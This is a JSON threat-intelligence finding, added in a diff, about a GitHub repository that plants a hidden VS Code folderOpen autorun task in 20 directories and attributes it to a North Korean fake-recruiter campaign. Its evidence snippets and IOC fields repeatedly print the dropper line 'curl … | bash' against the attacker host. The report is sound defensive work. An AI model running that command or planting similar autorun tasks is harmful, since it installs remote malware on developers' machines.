@@ -1,0 +1,198 @@
+{
+  "finding": {
+    "key": "repository:pratikp72/phoenixnext",
+    "kind": "repository",
+    "family": "",
+    "id": "pratikp72/phoenixnext",
+    "url": "https://github.com/pratikp72/PhoenixNext",
+    "registry": "github",
+    "owner": "pratikp72",
+    "status": "confirmed",
+    "confidence": "",
+    "score": 13,
+    "detection_method": "malicious_owner",
+    "attribution": "",
+    "campaign_id": "GW-C-498a0aeb",
+    "rules": "install_hook/vscode-autorun",
+    "evidence_locations": "src/.vscode/tasks.json:0; src/value-converters/.vscode/tasks.json:0; src/styles/.vscode/tasks.json:0; src/snomed/.vscode/tasks.json:0; src/reportbuilder/.vscode/tasks.json:0; src/ptdaysheet/.vscode/tasks.json:0; src/phxTelemed/.vscode/tasks.json:0; src/phxFlow/.vscode/tasks.json:0; src/PhxDataGrid/.vscode/tasks.json:0; src/phxCheckinDashboard/.vscode/tasks.json:0; src/pages/.vscode/tasks.json:0; src/odgo/.vscode/tasks.json:0; src/odgo/pages/.vscode/tasks.json:0; src/odgo/dialogs/.vscode/tasks.json:0; src/login/.vscode/tasks.json:0; src/locales/.vscode/tasks.json:0; src/locales/en/.vscode/tasks.json:0; src/kioskPreferences/.vscode/tasks.json:0; src/kioskPageOrder/.vscode/tasks.json:0; src/implantableDeviceLookup/.vscode/tasks.json:0",
+    "c2_hosts": "default-configuration.vercel.app",
+    "iocs": "default-configuration.vercel.app; https://default-configuration.vercel.app/settings/linux?flag=9-test; curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash; src/.vscode/tasks.json",
+    "matched_signatures": "",
+    "reasons": "repository under owner pratikp72 of a known-malicious repo | Tier-2 confirmed (bash score 12)",
+    "osm_status": "submitted",
+    "osm_threat_id": "b673385e-2eff-4c6a-a094-44f08c2ea6fb",
+    "first_seen": "hunt-20260702T052939Z",
+    "last_seen": "hunt-20260702T052939Z",
+    "evidence_file": "repositories/pratikp72_phoenixnext.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "src/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/value-converters/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/styles/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/snomed/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/reportbuilder/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/ptdaysheet/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/phxTelemed/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/phxFlow/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/PhxDataGrid/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/phxCheckinDashboard/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/pages/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/odgo/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/odgo/pages/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/odgo/dialogs/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/login/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/locales/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/locales/en/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/kioskPreferences/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/kioskPageOrder/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/implantableDeviceLookup/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    }
+  ],
+  "commit_sha": null,
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/pratikp72/phoenixnext",
+    "version_info": "all",
+    "threat_description": "VS Code autorun dropper. Payload in src/.vscode/tasks.json, src/value-converters/.vscode/tasks.json, src/styles/.vscode/tasks.json and 17 more files.\nOutbound: fetch-and-run. It downloads code from default-configuration.vercel.app and executes it (src/.vscode/tasks.json, src/value-converters/.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nThe same dropper is planted in 20 directories.\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: default-configuration.vercel.app.\nCampaign GW-C-498a0aeb: one of 89 confirmed repos across 14 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 3 distinct hosts, including default-configuration-sandy.vercel.app, default-configuration.vercel.app, vscode-extension-260120.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: default-configuration.vercel.app.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: src/.vscode/tasks.json, src/value-converters/.vscode/tasks.json, src/styles/.vscode/tasks.json, src/snomed/.vscode/tasks.json, src/reportbuilder/.vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from default-configuration.vercel.app and executes it (src/.vscode/tasks.json, src/value-converters/.vscode/tasks.json).\n- src/.vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed (+19 more)\n- Attacker hosts: default-configuration.vercel.app",
+    "publisher": "pratikp72",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "polinrider",
+      "contagious-interview",
+      "fake-recruiter",
+      "dprk",
+      "north-korea",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/pratikp72/phoenixnext/blob/HEAD/src/.vscode/tasks.json\nhttps://github.com/pratikp72/phoenixnext/blob/HEAD/src/value-converters/.vscode/tasks.json\nhttps://github.com/pratikp72/phoenixnext/blob/HEAD/src/styles/.vscode/tasks.json\nhttps://github.com/pratikp72/phoenixnext/blob/HEAD/src/snomed/.vscode/tasks.json\nhttps://github.com/pratikp72/phoenixnext/blob/HEAD/src/reportbuilder/.vscode/tasks.json\nhttps://github.com/pratikp72/phoenixnext/blob/HEAD/src/ptdaysheet/.vscode/tasks.json\nhttps://github.com/pratikp72/phoenixnext/blob/HEAD/src/phxTelemed/.vscode/tasks.json\nhttps://github.com/pratikp72/phoenixnext/blob/HEAD/src/phxFlow/.vscode/tasks.json\nhttps://github.com/pratikp72/phoenixnext/blob/HEAD/src/PhxDataGrid/.vscode/tasks.json\nhttps://github.com/pratikp72/phoenixnext/blob/HEAD/src/phxCheckinDashboard/.vscode/tasks.json\nhttps://github.com/pratikp72/phoenixnext/blob/HEAD/src/pages/.vscode/tasks.json\nhttps://github.com/pratikp72/phoenixnext/blob/HEAD/src/odgo/.vscode/tasks.json\nhttps://github.com/pratikp72/phoenixnext/blob/HEAD/src/odgo/pages/.vscode/tasks.json\nhttps://github.com/pratikp72/phoenixnext/blob/HEAD/src/odgo/dialogs/.vscode/tasks.json\nhttps://github.com/pratikp72/phoenixnext/blob/HEAD/src/login/.vscode/tasks.json",
+    "verified_iocs": "default-configuration.vercel.app\nhttps://default-configuration.vercel.app/settings/linux?flag=9-test\ncurl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash\nsrc/.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-07-02T05:29:39Z",
+    "last_seen": "2026-07-02T05:29:39Z"
+  }
+}
